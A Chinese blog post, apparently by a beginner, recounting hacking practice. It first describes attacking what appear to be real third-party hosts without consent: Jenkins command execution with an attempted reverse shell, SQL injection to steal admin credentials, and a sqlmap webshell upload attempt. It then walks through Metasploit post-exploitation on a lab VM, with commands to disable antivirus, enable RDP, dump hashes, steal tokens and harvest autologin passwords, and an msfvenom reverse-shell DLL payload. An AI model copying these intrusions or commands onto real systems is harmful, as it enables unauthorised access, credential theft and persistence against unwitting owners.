一开始想找一台主机使用445端口的漏洞，总会遇到几个安全意识薄弱吧！至少我是这么坚信的

写一个爬虫在fofa上面爬取445端口的ip

![](https://image.3001.net/images/20220912/1662983421_631f1cfd25327ebdc11fe.png!small)

Nmap扫一下

![1662983450_631f1d1acba40907d8a66.png!small](https://image.3001.net/images/20220912/1662983450_631f1d1acba40907d8a66.png!small)

扫出来的结果基本上都是被过滤了![1662983499_631f1d4bc8a16a21a04a3.png!small](https://image.3001.net/images/20220912/1662983499_631f1d4bc8a16a21a04a3.png!small)

发现很难找到445端口开放的ip，后面想着去外网挖几个别的漏洞开启本次的学习

在fofa上找jenkins未授权

![1662983541_631f1d751eb9cb19282c0.png!small](https://image.3001.net/images/20220912/1662983541_631f1d751eb9cb19282c0.png!small)

发现一台美国主机可以执行一些低权限命令

![1662983563_631f1d8b51e31232d2f3a.png!small](https://image.3001.net/images/20220912/1662983563_631f1d8b51e31232d2f3a.png!small)

成功执行，接下来尝试反弹shell

![1662983586_631f1da2ada0c705a9706.png!small](https://image.3001.net/images/20220912/1662983586_631f1da2ada0c705a9706.png!small)

攻击机监听7777端口

没弹出来，用dnslog.cn发现ping都ping不出网

![1662983615_631f1dbf005ab5f3b0850.png!small](https://image.3001.net/images/20220912/1662983615_631f1dbf005ab5f3b0850.png!small)

后面找了个印度的网站，拿到了账号密码，现在只需要找到后台登录页面

发现他没有登录页面。。。。

后面发现他报错会出绝对路径

![1662983650_631f1de2e193444b9d857.png!small](https://image.3001.net/images/20220912/1662983650_631f1de2e193444b9d857.png!small)

没有读写权限，再见吧

又找到了一个sql注入漏洞

![1662983678_631f1dfe6ff84643ace26.png!small](https://image.3001.net/images/20220912/1662983678_631f1dfe6ff84643ace26.png!small)

我拿到了管理员账户密码，但是问题来了，他的后台页面在哪？上了几个字典admin.php始终500，下一个吧

又发现一个注入点

![1662983730_631f1e32cbf23356897a2.png!small](https://image.3001.net/images/20220912/1662983730_631f1e32cbf23356897a2.png!small)

甚至还有绝对路径，上sqlmap

![1662983756_631f1e4c0e4c6d1cb06a5.png!small](https://image.3001.net/images/20220912/1662983756_631f1e4c0e4c6d1cb06a5.png!small)

估计是某个俄罗斯的cms

![1662983783_631f1e6723edde156022c.png!small](https://image.3001.net/images/20220912/1662983783_631f1e6723edde156022c.png!small)

先用sqlmap上传冰蝎马上去试试

![1662983810_631f1e82c8c20cc801027.png!small](https://image.3001.net/images/20220912/1662983810_631f1e82c8c20cc801027.png!small)

没有读写权限，哎，找找后台

![1662983844_631f1ea4ded5b0ecea664.png!small](https://image.3001.net/images/20220912/1662983844_631f1ea4ded5b0ecea664.png!small)

找到了就是有点小瑕疵403，经过几次尝试绕过403，都没绕过去

找了好久不知道怎么进后台，现在后台有账号密码都不好进了吗？？

考59分比考0分还难受，嘚我自己搭建靶机自己学习吧

# 漏洞利用

对后渗透的学习主要是参考微信的一篇文章

mp.weixin.qq.com/s/700Qe9-3NZHV5ribffcBew

![1662983886_631f1ece518259f1dddce.png!small](https://image.3001.net/images/20220912/1662983886_631f1ece518259f1dddce.png!small)

在文章中我觉得最难的是这个步骤，因为经验不足，不知道要使用哪些漏洞哪些工具，导致无法进一步渗透，我觉得批量poc扫描类的工具，特别适合我这种入门者积累经验

![1662983904_631f1ee0a5444f2a11fda.png!small](https://image.3001.net/images/20220912/1662983904_631f1ee0a5444f2a11fda.png!small)

没有这个payload，我用别的拿一个Metasploit会话吧

![1662983926_631f1ef6b0d34a0e50087.png!small](https://image.3001.net/images/20220912/1662983926_631f1ef6b0d34a0e50087.png!small)

拿到会话

# 信息收集

![1662983988_631f1f34c259f7a13ae20.png!small](https://image.3001.net/images/20220912/1662983988_631f1f34c259f7a13ae20.png!small)

使用run post/windows/manage/migrate

自动迁移到合适的稳定进程，开始信息收集

查看目标主机的系统信息

![1662984009_631f1f494478a4134a649.png!small](https://image.3001.net/images/20220912/1662984009_631f1f494478a4134a649.png!small)

run post/windows/gather/checkvm检查是否为虚拟机

![1662984026_631f1f5af2b3f35f1f5a1.png!small](https://image.3001.net/images/20220912/1662984026_631f1f5af2b3f35f1f5a1.png!small)

查看目标机最近的运行时间

idletime

![1662984085_631f1f95dbd5da43227a8.png!small](https://image.3001.net/images/20220912/1662984085_631f1f95dbd5da43227a8.png!small)

查看目标机完整的网络设置

![1662984113_631f1fb18b765205f1feb.png!small](https://image.3001.net/images/20220912/1662984113_631f1fb18b765205f1feb.png!small)

查看已经渗透成功的目标主机的用户名

getuid![1662984140_631f1fccaf49fc07ca2cf.png!small](https://image.3001.net/images/20220912/1662984140_631f1fccaf49fc07ca2cf.png!small)

关闭目标机操作系统杀毒软件

run post/windows/manage/killav

![1662984164_631f1fe460e105b3f2331.png!small](https://image.3001.net/images/20220912/1662984164_631f1fe460e105b3f2331.png!small)

启动目标机的远程桌面协议

run post/windows/manage/enable_rdp

![1662984182_631f1ff629058b87a5eb4.png!small](https://image.3001.net/images/20220912/1662984182_631f1ff629058b87a5eb4.png!small)

![1662984200_631f200870ffb646fa812.png!small](https://image.3001.net/images/20220912/1662984200_631f200870ffb646fa812.png!small)

查看目标机的本地子网情况

run post/windows/manage/autoroute

![1662984233_631f2029efe9b30ffe90d.png!small](https://image.3001.net/images/20220912/1662984233_631f2029efe9b30ffe90d.png!small)

列举当前有多少用户登陆了目标机

run post/windows/gather/enum_logged_on_users

![1662984253_631f203d71fd7c7aec77c.png!small](https://image.3001.net/images/20220912/1662984253_631f203d71fd7c7aec77c.png!small)

列举安装在目标机上的应用程序

run post/windows/gather/enum_applications

![1662984272_631f20503a4cdb587e098.png!small](https://image.3001.net/images/20220912/1662984272_631f20503a4cdb587e098.png!small)

查看自动登陆的用户和密码

load espia

run windows/gather/credentials/windows_autologin

![1662984295_631f20672cccdb90574c2.png!small](https://image.3001.net/images/20220912/1662984295_631f20672cccdb90574c2.png!small)

查看自动登陆的用户和密码

load espia

run windows/gather/credentials/windows_autologin

![1662984325_631f208563df9125f65e2.png!small](https://image.3001.net/images/20220912/1662984325_631f208563df9125f65e2.png!small)

截屏

screengrab

![1662984343_631f20974292520e31a1e.png!small](https://image.3001.net/images/20220912/1662984343_631f20974292520e31a1e.png!small)

查看目标机camera

webcam_list

![1662984360_631f20a8d4d32f9c27169.png!small](https://image.3001.net/images/20220912/1662984360_631f20a8d4d32f9c27169.png!small)

虚拟机没有摄像头

进入shell

![1662984377_631f20b97df8573289e8a.png!small](https://image.3001.net/images/20220912/1662984377_631f20b97df8573289e8a.png!small)

这里乱码可以下载terminator终端修改编码

# 提权

![1662984409_631f20d94c919281ebfaa.png!small](https://image.3001.net/images/20220912/1662984409_631f20d94c919281ebfaa.png!small)

这里直接就是最高权限了

查看系统的已打补

![1662984519_631f214708a7a8c21107e.png!small](https://image.3001.net/images/20220912/1662984519_631f214708a7a8c21107e.png!small)

安装了一个补丁

列出补丁

Wmic qfe get Caption,Description,HotFixID,InstalledOn

![1662984539_631f215b752abe8d7b219.png!small](https://image.3001.net/images/20220912/1662984539_631f215b752abe8d7b219.png!small)

开始提权，使用ms16_032进行提权

![1662984558_631f216e50505bc3bc8c3.png!small](https://image.3001.net/images/20220912/1662984558_631f216e50505bc3bc8c3.png!small)

这里权限太高了，我重新反弹一个会话

![1662984581_631f21854c8aa0029f8e5.png!small](https://image.3001.net/images/20220912/1662984581_631f21854c8aa0029f8e5.png!small)

拿到了一个低权限的用户

![1662984602_631f219a8e630a0e2f766.png!small](https://image.3001.net/images/20220912/1662984602_631f219a8e630a0e2f766.png!small)

emmm没有成功

 **令牌窃取**

列出可用的token

use incognito

list_tokens -u

![1662984626_631f21b29b9f499ed69a7.png!small](https://image.3001.net/images/20220912/1662984626_631f21b29b9f499ed69a7.png!small)

有两种令牌Delegation Tokens和Impersonation Tokens其中Impersonation Tokens一个都没有

根据文章，他已经获得了一个高权限的令牌，这里我没有获取高权限的令牌，我尝试把每一个管理员用户都登录了一边，打开程序了一下还是只能看到这个的token。T_T

 **Hash提权攻击**

hashdump抓取密码

![1662984674_631f21e24dca8f3260aff.png!small](https://image.3001.net/images/20220912/1662984674_631f21e24dca8f3260aff.png!small)

直接用会报错，文章中介绍到需要迁移到SYSTEM权限的进程

![1662984698_631f21fa01a04dbe70c3f.png!small](https://image.3001.net/images/20220912/1662984698_631f21fa01a04dbe70c3f.png!small)

尝试迁到这个进程中（我甚至看不到别的进程情况）

![1662984718_631f220ebdf975e151e0b.png!small](https://image.3001.net/images/20220912/1662984718_631f220ebdf975e151e0b.png!small)

无法迁移，也就是说如果要迁移到其他进程需要系统权限，才能使用hash提权攻击，emmmm试了试他的方式，我用低权限账户没有办法这样提权

# 移植github漏洞模块

![1662984754_631f223271088be3dc25e.png!small](https://image.3001.net/images/20220912/1662984754_631f223271088be3dc25e.png!small)

将GitHub的脚本放入指定的位置

![1662984772_631f22444b6595b878f39.png!small](https://image.3001.net/images/20220912/1662984772_631f22444b6595b878f39.png!small)

重新加载所以文件

加载刚刚导入的脚本

![1662984791_631f22570c19bae07d565.png!small](https://image.3001.net/images/20220912/1662984791_631f22570c19bae07d565.png!small)

Msfvenom命令生成DLL

msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.119.129
lport=2222 -f dll -o ~/eternal11.dll

![1662984809_631f2269d7681d3a2153d.png!small](https://image.3001.net/images/20220912/1662984809_631f2269d7681d3a2153d.png!small)

设置完payload，执行的时候发现和文章结果完全不一样

![1662984839_631f2287e91aad1399d4c.png!small](https://image.3001.net/images/20220912/1662984839_631f2287e91aad1399d4c.png!small)

我先继续往下学习吧

# 植入后门

emmmmm我还是先切回管理员权限吧

![1662984895_631f22bf2b048e34559f4.png!small](https://image.3001.net/images/20220912/1662984895_631f22bf2b048e34559f4.png!small)

我和文章有一样的遗憾

![1662984913_631f22d1965986b236a57.png!small](https://image.3001.net/images/20220912/1662984913_631f22d1965986b236a57.png!small)

还有web后门

![1662984928_631f22e0c57a6844a7871.png!small](https://image.3001.net/images/20220912/1662984928_631f22e0c57a6844a7871.png!small)

这个emmmmm我就不尝试了，web后门挺常见的

这篇文章让我要干什么大致有了一个方向

  1. 拿到webshell，或者rec
  2. 反弹到msf或者CS
  3. 开始收集相关信息，准备提权
  4. 开始提权
  5. 提权成功，植入后门
  6. 维持权限

PS:第一次写文章，技术水平还比较低T_T，谢谢这位师傅（Eastmount ）的文章

